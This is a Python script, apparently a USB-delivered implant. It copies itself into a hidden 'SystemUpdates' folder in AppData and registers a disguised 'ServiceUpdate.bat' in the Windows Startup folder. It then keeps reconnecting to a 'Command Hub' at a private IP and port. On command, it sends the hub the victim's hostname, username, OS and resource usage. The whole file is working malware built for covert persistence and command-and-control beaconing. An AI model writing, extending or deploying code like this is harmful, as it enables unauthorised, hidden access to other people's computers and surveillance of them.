import os
import shutil
import sys

def establish_persistence():
    # 1. Define the hidden path (AppData is a great hiding spot)
    app_data = os.getenv('APPDATA')
    target_dir = os.path.join(app_data, 'SystemUpdates')
    target_file = os.path.join(target_dir, 'win_manager.py')

    # 2. Create the folder if it doesn't exist
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    # 3. Copy itself from the USB to the Laptop's internal drive
    if not os.path.exists(target_file):
        shutil.copy(sys.argv[0], target_file)
        
        # 4. Add to Startup so it runs every time the laptop turns on
        startup_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        with open(os.path.join(startup_folder, "ServiceUpdate.bat"), "w") as f:
            f.write(f'python "{target_file}"')

# Run this before the connection logic
establish_persistence()

import argparse
import getpass
import json
import os
import platform
import socket
import time


def get_username() -> str:
    try:
        return os.getlogin()
    except OSError:
        return getpass.getuser()


def report_status() -> str:
    info = {
        'OS': platform.system(),
        'Version': platform.version(),
        'Hostname': socket.gethostname(),
        'User': get_username(),
        'Python': platform.python_version(),
    }

    try:
        import psutil

        uptime_seconds = time.time() - psutil.boot_time()
        info['Uptime'] = f'{uptime_seconds:.2f}s'
        info['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
        info['Memory'] = f'{psutil.virtual_memory().percent}% used'
    except ImportError:
        info['Uptime'] = 'N/A (psutil not installed)'

    return json.dumps(info)


def connect_to_hub(hub_ip: str, port: int) -> None:
    delay = 1
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10.0)

        try:
            client.connect((hub_ip, port))
            print(f"[*] Connected to Command Hub at {hub_ip}:{port}")
            delay = 1

            while True:
                try:
                    data = client.recv(4096).decode('utf-8', errors='ignore')
                except socket.timeout:
                    continue

                if not data:
                    print("[-] Connection closed by hub")
                    break

                for message in data.strip().splitlines():
                    command = message.strip()
                    if not command:
                        continue

                    if command == 'STATUS_REPORT':
                        report = report_status()
                        client.sendall(f'STATUS:{report}\n'.encode('utf-8'))
                        print('[*] Status report sent.')
                    elif command == 'SHUTDOWN_NODE':
                        print('[*] Shutdown command received, disconnecting.')
                        return
                    elif command == 'PING':
                        client.sendall(b'PING_OK\n')
                        print('[*] Ping response sent.')
                    else:
                        print(f'[?] Unknown command: {command}')
        except KeyboardInterrupt:
            print('\n[*] Node stopped by user.')
            break
        except Exception as exc:
            print(f'[-] Connection failed: {exc}')
        finally:
            try:
                client.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            client.close()

        print(f'[*] Reconnecting in {delay} second(s)...')
        time.sleep(delay)
        delay = min(delay * 2, 30)


def main() -> None:
    parser = argparse.ArgumentParser(description='Node client for the command hub')
    parser.add_argument('--host', default='192.168.100.9', help='Hub hostname or IP address')
    parser.add_argument('--port', type=int, default=9999, help='Hub port')
    args = parser.parse_args()

    connect_to_hub(args.host, args.port)


if __name__ == '__main__':
    main()
